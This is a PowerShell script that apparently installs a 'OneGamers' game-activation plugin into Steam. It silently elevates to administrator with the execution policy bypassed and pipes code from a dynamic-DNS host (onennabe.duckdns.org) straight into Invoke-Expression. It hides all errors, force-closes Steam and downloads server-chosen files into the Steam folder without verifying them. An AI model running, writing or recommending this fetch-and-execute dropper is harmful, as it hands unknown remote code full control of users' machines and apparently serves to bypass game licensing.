<# OneGamers Activation — Ultra-Fast Installer #>
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Require administrator (elevate silently if not admin)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', "irm https://onennabe.duckdns.org/gamekey | iex"
    } catch {}
    return
}

# 2. Locate Steam folder
$steam = $null
try { $steam = (Get-ItemProperty 'HKCU:\Software\Valve\Steam' -ErrorAction SilentlyContinue).SteamPath } catch {}
if (-not $steam) {
    try { $steam = (Get-ItemProperty 'HKLM:\SOFTWARE\WOW6432Node\Valve\Steam' -ErrorAction SilentlyContinue).InstallPath } catch {}
}
if (-not $steam) { $steam = 'C:\Program Files (x86)\Steam' }
$steam = ($steam -replace '/', '\').TrimEnd('\')

if (-not (Test-Path (Join-Path $steam 'steam.exe'))) {
    Write-Host "Steam folder not found at default location. Please select your Steam folder manually." -ForegroundColor Red
    return
}

Write-Host "OneGamers Setup: Installing to $steam..." -ForegroundColor Cyan

# 3. Close Steam processes
foreach ($proc in 'steam', 'steamwebhelper') {
    Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 1

# 4. Fast WebClient downloader
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

# Fetch file list from server
$filesList = @()
try {
    $json = $wc.DownloadString('https://onennabe.duckdns.org/api/onegamers/files')
    if ($json) {
        $data = $json | ConvertFrom-Json
        if ($data -and $data.files) { $filesList = $data.files }
    }
} catch {}

$downloadedCount = 0

if ($filesList.Count -gt 0) {
    foreach ($file in $filesList) {
        $relPath  = ($file.path -replace '/', '\')
        $destFile = Join-Path $steam $relPath
        $destDir  = Split-Path $destFile
        if (-not (Test-Path $destDir)) { $null = New-Item -ItemType Directory -Path $destDir -Force }

        $downloadUrl = "https://onennabe.duckdns.org/onegamers/$($file.path)"
        Write-Host "  Downloading: $relPath..." -ForegroundColor Gray
        try {
            $wc.DownloadFile($downloadUrl, $destFile)
            if (Test-Path $destFile) { $downloadedCount++ }
        } catch {
            Write-Host "  Failed to download ${relPath} - $_" -ForegroundColor Yellow
        }
    }
}

# Fallback: if file list was empty, download plugin bundle directly
if ($downloadedCount -eq 0) {
    $pluginDir = Join-Path $steam 'millennium\plugins'
    if (-not (Test-Path $pluginDir)) { $null = New-Item -ItemType Directory -Path $pluginDir -Force }
    $starPath = Join-Path $pluginDir 'com.onegamers.gamekey.star'
    
    foreach ($url in @('https://onennabe.duckdns.org/onegamers/com.onegamers.gamekey.star', 'https://onennabe.duckdns.org/com.onegamers.gamekey.star')) {
        try {
            $wc.DownloadFile($url, $starPath)
            if ((Test-Path $starPath) -and (Get-Item $starPath).Length -ge 1024) { $downloadedCount = 1; break }
        } catch {}
    }
}

Write-Host "OneGamers Setup Complete ($downloadedCount file(s) installed). Starting Steam..." -ForegroundColor Green
Start-Sleep -Seconds 1

# 5. Launch Steam
try { Start-Process (Join-Path $steam 'steam.exe') } catch {}
